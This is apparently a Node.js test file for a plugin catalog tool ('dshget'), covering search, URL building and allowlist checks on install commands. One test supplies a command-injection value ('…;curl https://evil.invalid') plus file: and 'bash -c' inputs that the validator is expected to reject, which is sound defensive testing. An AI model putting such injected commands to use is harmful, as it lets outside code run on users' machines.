import test from 'node:test'
import assert from 'node:assert/strict'
import {
  findPlugin,
  parseDshgetCommand,
  parseInstallSpec,
  pluginDetailUrl,
  pluginResult,
  searchCatalog,
  validateCatalog,
} from '../src/core.js'

function fixtureCatalog() {
  return {
    name: 'dshget',
    categories: { memory: { en: 'Memory', zh: '记忆' }, ui: { en: 'UI', zh: '界面' } },
    plugins: [
      {
        owner: 'volcengine',
        name: 'OpenViking#examples/dsh-memory-plugin',
        description: { en: 'OpenViking memory and recall tools', zh: '记忆工具' },
        category: 'memory',
        stars: 100,
        tags: ['memory', 'recall'],
        sources: ['omdsh-hub'],
        installable: true,
        install: 'dsh plugin --profile web add github:volcengine/OpenViking#path:/examples/dsh-memory-plugin',
        url: 'https://github.com/volcengine/OpenViking/tree/main/examples/dsh-memory-plugin',
      },
      {
        owner: 'example',
        name: 'memory-lite',
        description: { en: 'Small memory plugin', zh: '' },
        category: 'memory',
        stars: 20,
        tags: ['memory'],
        sources: ['github-topic'],
        installable: true,
        install: 'dsh plugin --profile web add @example/memory-lite@1.2.0',
        url: 'https://github.com/example/memory-lite',
      },
      {
        owner: 'example',
        name: 'better-sidebar',
        description: { en: 'A better DSH sidebar', zh: '' },
        category: 'ui',
        stars: 500,
        tags: ['sidebar'],
        sources: ['awesome-dsh-plugin'],
        installable: true,
        install: 'dsh plugin --profile web add github:example/better-sidebar',
        url: 'https://github.com/example/better-sidebar',
      },
    ],
  }
}

test('validates and searches the normalized catalog', () => {
  const catalog = validateCatalog(fixtureCatalog())
  const result = searchCatalog(catalog, { query: 'memory', limit: 10 })
  assert.equal(result.total, 2)
  assert.equal(result.plugins[0].name, 'memory-lite')
  assert.equal(result.plugins[1].owner, 'volcengine')
})

test('exact plugin identity outranks star count', () => {
  const result = searchCatalog(fixtureCatalog(), { query: 'example/memory-lite', limit: 1 })
  assert.equal(result.plugins[0].name, 'memory-lite')
})

test('supports category filters and validates result limits', () => {
  const result = searchCatalog(fixtureCatalog(), { query: 'plugin', category: 'ui', limit: 10 })
  assert.deepEqual(result.plugins.map(plugin => plugin.name), ['better-sidebar'])
  assert.throws(() => searchCatalog(fixtureCatalog(), { query: 'memory', limit: 0 }), /between 1 and 50/)
})

test('finds special-character ids from owner/name and DSH Get URLs', () => {
  const catalog = fixtureCatalog()
  const plugin = catalog.plugins[0]
  const detailsUrl = pluginDetailUrl(plugin)
  assert.equal(detailsUrl, 'https://www.dshget.com/plugins/volcengine/OpenViking%23examples%2Fdsh-memory-plugin')
  assert.equal(findPlugin(catalog, 'volcengine/OpenViking#examples/dsh-memory-plugin'), plugin)
  assert.equal(findPlugin(catalog, detailsUrl), plugin)
})

test('returns stable, useful result fields', () => {
  const item = pluginResult(fixtureCatalog().plugins[2], 'https://www.dshget.com/')
  assert.deepEqual(item, {
    id: 'example/better-sidebar',
    name: 'better-sidebar',
    owner: 'example',
    description: 'A better DSH sidebar',
    category: 'ui',
    stars: 500,
    installable: true,
    installCommand: 'dsh plugin --profile web add github:example/better-sidebar',
    repositoryUrl: 'https://github.com/example/better-sidebar',
    detailsUrl: 'https://www.dshget.com/plugins/example/better-sidebar',
  })
})

test('extracts only allowlisted GitHub and npm install specs', () => {
  assert.equal(
    parseInstallSpec('dsh plugin --profile web add github:volcengine/OpenViking#path:/examples/dsh-memory-plugin'),
    'github:volcengine/OpenViking#path:/examples/dsh-memory-plugin',
  )
  assert.equal(parseInstallSpec('dsh plugin add @example/memory-lite@1.2.0'), '@example/memory-lite@1.2.0')
  assert.equal(
    parseInstallSpec('dsh plugin --profile web add "https://github.com/lehhair/dsh-diff-viewer/releases/latest/download/dsh-external-dsh-diff-viewer.tgz"'),
    'https://github.com/lehhair/dsh-diff-viewer/releases/latest/download/dsh-external-dsh-diff-viewer.tgz',
  )
  assert.throws(() => parseInstallSpec('dsh plugin add github:owner/repo;curl https://evil.invalid'), /unsupported/)
  assert.throws(() => parseInstallSpec('dsh plugin add file:/tmp/untrusted'), /unsafe/)
  assert.throws(() => parseInstallSpec('dsh plugin add https://example.com/plugin.tgz'), /unsafe/)
  assert.throws(() => parseInstallSpec('bash -c "dsh plugin add safe"'), /unsupported/)
})

test('parses human subcommands without interpreting the remaining text', () => {
  assert.deepEqual(parseDshgetCommand('  search  memory recall '), { action: 'search', value: 'memory recall' })
  assert.deepEqual(parseDshgetCommand(''), { action: 'help', value: '' })
})

test('rejects duplicate or malformed catalog entries', () => {
  const duplicate = fixtureCatalog()
  duplicate.plugins.push({ ...duplicate.plugins[0] })
  assert.throws(() => validateCatalog(duplicate), /duplicate plugin/)
  assert.throws(() => validateCatalog({ categories: {}, plugins: [{ owner: '', name: 'bad', install: 'x' }] }), /owner and name/)
})
